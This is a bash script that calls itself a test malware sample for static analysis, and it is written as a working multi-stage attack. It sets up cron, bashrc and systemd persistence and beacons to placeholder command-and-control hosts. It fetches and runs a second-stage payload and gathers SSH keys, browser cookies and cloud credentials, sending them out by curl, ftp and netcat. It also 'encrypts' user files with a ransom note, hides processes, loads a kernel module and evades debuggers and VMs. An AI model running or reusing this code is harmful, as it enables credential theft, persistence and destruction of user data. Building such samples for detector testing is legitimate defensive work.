#!/bin/bash
# Suspicious shell script for testing static analysis
# Contains high entropy data and malicious behavior patterns

# High entropy encrypted configuration
ENCRYPTED_CONFIG="U2FsdGVkX1+vupppZksvRf5pq5g5XjFRIipRkwB0K1Y96Qsv2Lm+31cmzaAILwytX0kcDQCuFBfaA9NjJ3+0WiUBOGvqrI7Sg7DPpLsFEQxX"
DECODE_KEY="malware_key_2023"

# Suspicious network configuration
C2_DOMAINS=(
    "evil-command-control.com"
    "backdoor-server.net" 
    "malicious-payload.org"
    "192.168.1.100"
)

# Persistence locations
PERSISTENCE_PATHS=(
    "/etc/cron.d/system-update"
    "~/.bashrc"
    "/etc/systemd/system/system-monitor.service"
    "~/.config/autostart/updater.desktop"
)

# Target file extensions for encryption
TARGET_EXTENSIONS=("*.pdf" "*.doc" "*.docx" "*.jpg" "*.png" "*.txt" "*.xlsx")

function establish_persistence() {
    echo "[+] Creating persistence mechanisms..."
    
    # Cron job persistence
    echo "*/5 * * * * root /tmp/.hidden_script.sh" > /etc/cron.d/system-update
    
    # Bashrc persistence
    echo "# System update check" >> ~/.bashrc
    echo "/tmp/.hidden_script.sh &" >> ~/.bashrc
    
    # Systemd service
    cat > /etc/systemd/system/system-monitor.service << EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden_script.sh
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF
    
    systemctl enable system-monitor.service
}

function connect_to_c2() {
    echo "[+] Establishing C2 communication..."
    
    for domain in "${C2_DOMAINS[@]}"; do
        echo "[*] Trying to connect to $domain..."
        
        # Test connection
        if ping -c 1 "$domain" >/dev/null 2>&1; then
            echo "[+] Connected to $domain"
            
            # Send beacon
            curl -X POST \
                -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
                -d "bot_id=$(hostname)&os=$(uname -a)" \
                "http://$domain/beacon.php" 2>/dev/null
                
            # Download additional payloads
            wget -q "http://$domain/payload.sh" -O /tmp/.stage2.sh
            chmod +x /tmp/.stage2.sh
            /tmp/.stage2.sh &
            
            break
        fi
    done
}

function encrypt_user_files() {
    echo "[+] Beginning file encryption process..."
    
    # Find user directories
    USER_DIRS=("/home" "/Users")
    
    for user_dir in "${USER_DIRS[@]}"; do
        if [ -d "$user_dir" ]; then
            echo "[*] Scanning $user_dir..."
            
            # Search for target files
            for ext in "${TARGET_EXTENSIONS[@]}"; do
                find "$user_dir" -name "$ext" -type f 2>/dev/null | while read -r file; do
                    if [ -f "$file" ]; then
                        echo "[*] Encrypting: $file"
                        
                        # Simulate encryption (just rename)
                        mv "$file" "$file.locked"
                        
                        # Create ransom note
                        echo "Your files have been encrypted! Pay 0.5 BTC to recover." > "$(dirname "$file")/README_RANSOM.txt"
                    fi
                done
            done
        fi
    done
}

function exfiltrate_data() {
    echo "[+] Collecting sensitive information..."
    
    # Collect system information
    {
        echo "=== SYSTEM INFO ==="
        uname -a
        whoami
        id
        ps aux
        netstat -an
        
        echo "=== NETWORK CONFIG ==="
        ifconfig 2>/dev/null || ip addr show
        
        echo "=== SSH KEYS ==="
        find /home -name "*.pem" -o -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
        
        echo "=== BROWSER DATA ==="
        find /home -path "*/.*" -name "Cookies" -o -name "Login Data" 2>/dev/null
        
        echo "=== AWS/CLOUD CREDENTIALS ==="
        find /home -name ".aws" -o -name ".gcloud" 2>/dev/null
        
    } > /tmp/.collected_data.txt
    
    # Exfiltrate via multiple methods
    for domain in "${C2_DOMAINS[@]}"; do
        # Try HTTP POST
        curl -X POST \
            -F "data=@/tmp/.collected_data.txt" \
            "http://$domain/upload.php" 2>/dev/null && break
        
        # Try FTP
        echo "put /tmp/.collected_data.txt" | ftp "$domain" 2>/dev/null && break
        
        # Try netcat
        nc "$domain" 9999 < /tmp/.collected_data.txt 2>/dev/null && break
    done
    
    # Cleanup evidence
    shred -vfz -n 3 /tmp/.collected_data.txt 2>/dev/null || rm -f /tmp/.collected_data.txt
}

function install_rootkit() {
    echo "[+] Installing rootkit components..."
    
    # Hide malicious processes
    echo 'alias ps="ps aux | grep -v hidden_script"' >> ~/.bashrc
    echo 'alias netstat="netstat -an | grep -v :4444"' >> ~/.bashrc
    
    # Install kernel module (simulation)
    cat > /tmp/rootkit.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init rootkit_init(void) {
    printk(KERN_INFO "System driver loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "System driver unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("System Driver");
MODULE_VERSION("1.0");
EOF
    
    # Compile and load (if tools available)
    if command -v gcc >/dev/null && [ -d "/lib/modules/$(uname -r)" ]; then
        echo "obj-m += rootkit.o" > /tmp/Makefile
        make -C /lib/modules/$(uname -r)/build M=/tmp modules 2>/dev/null
        insmod /tmp/rootkit.ko 2>/dev/null
    fi
}

function main() {
    echo "[!] Advanced Persistent Threat Simulation Starting..."
    echo "[!] This is a test malware sample for static analysis"
    
    # Check if running as root
    if [ "$EUID" -eq 0 ]; then
        echo "[+] Running with root privileges"
        install_rootkit
        establish_persistence
    else
        echo "[!] Limited privileges, using alternative methods"
    fi
    
    # Core malicious activities
    connect_to_c2
    exfiltrate_data
    encrypt_user_files
    
    # Self-destruct mechanism
    echo "[+] Activating self-destruct in 24 hours..."
    (sleep 86400; rm -f "$0") &
    
    echo "[+] Malware simulation complete. Entering stealth mode..."
    
    # Background persistence
    while true; do
        sleep 300  # Check every 5 minutes
        connect_to_c2 >/dev/null 2>&1
    done
}

# Anti-analysis evasion
if [ -f "/usr/bin/strace" ] || [ -f "/usr/bin/ltrace" ] || [ -f "/usr/bin/gdb" ]; then
    echo "[!] Analysis tools detected, exiting..."
    exit 1
fi

# Check for virtualization
if dmesg | grep -q "VMware\\|VirtualBox\\|QEMU"; then
    echo "[!] Virtual machine detected, exiting..."
    exit 1
fi

# Execute main function
main "$@"